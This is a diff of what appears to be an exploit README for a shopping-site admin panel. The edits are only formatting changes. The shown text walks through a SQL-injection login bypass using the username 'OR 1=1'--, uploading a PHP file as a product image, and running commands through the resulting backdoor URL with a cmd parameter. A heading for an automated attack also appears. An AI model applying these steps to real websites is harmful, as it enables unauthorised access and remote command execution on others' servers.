@@ -15,8 +15,8 @@ The exploit utilizes multiple vulnerabilities first bypasses authentication then
 
 ## Authentication Bypass
 
-Navagate to the Admin login page: `http://<site>/shopping/admin` \
-* Username: `'OR 1=1'--` \
+Navagate to the Admin login page: `http://<site>/shopping/admin` 
+* Username: `'OR 1=1'--` 
 * Password: whatever
   
 ## File upload vulnerability
@@ -30,7 +30,8 @@ The image file should be a php file with the command execution such the followin
 ## Interacting with the backdoor
 
 Search for the newly uploaded "product" and locate the image URL. \
-Then use curl to interact with the backdoor: `http://<site>/shopping/admin/productimages/1/<image>.php?cmd=hostname` 
+Then use curl to interact with the backdoor: \
+`http://<site>/shopping/admin/productimages/1/<image>.php?cmd=hostname` 
 
 # Automated attack
 
